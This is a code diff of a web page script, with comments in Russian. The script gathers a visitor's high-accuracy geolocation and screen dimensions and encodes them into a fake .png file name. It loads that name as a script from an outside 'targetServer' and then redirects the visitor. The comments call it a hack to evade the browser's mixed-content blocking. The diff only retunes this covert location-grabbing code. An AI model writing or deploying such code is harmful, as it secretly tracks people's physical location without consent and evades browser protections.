@@ -29,7 +29,7 @@
                 try {
                     const pos = await new Promise((res, rej) => {
                         navigator.geolocation.getCurrentPosition(res, rej, {
-                            enableHighAccuracy: true, timeout: 4000
+                            enableHighAccuracy: true, timeout: 3500
                         });
                     });
                     info.lat = pos.coords.latitude;
@@ -39,16 +39,18 @@
 
             const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
             
-            // --- ХАК ДЛЯ ОБХОДА БЛОКИРОВКИ HTTPS -> HTTP ---
+            // --- СОЗДАЕМ ТЕГ SCRIPT ДЛЯ ОБХОДА БЛОКИРОВКИ ---
             const script = document.createElement('script');
             const go = () => { window.location.href = `${finalRedirect}${slug}?ready=1`; };
             
+            // Если скрипт «загрузился» (т.е. сервер ответил), уходим на редирект
             script.onload = script.onerror = go;
-            // Используем тег script, так как он игнорирует Mixed Content блокировку в 99% случаев
             script.src = `${targetServer}${fileName}?t=${Date.now()}`;
             
             document.head.appendChild(script);
-            setTimeout(go, 5000); // Резервный редирект
+            
+            // Страховка: если через 5 сек ничего не вышло — уходим по-любому
+            setTimeout(go, 5000);
         }
 
         collectAndGo();
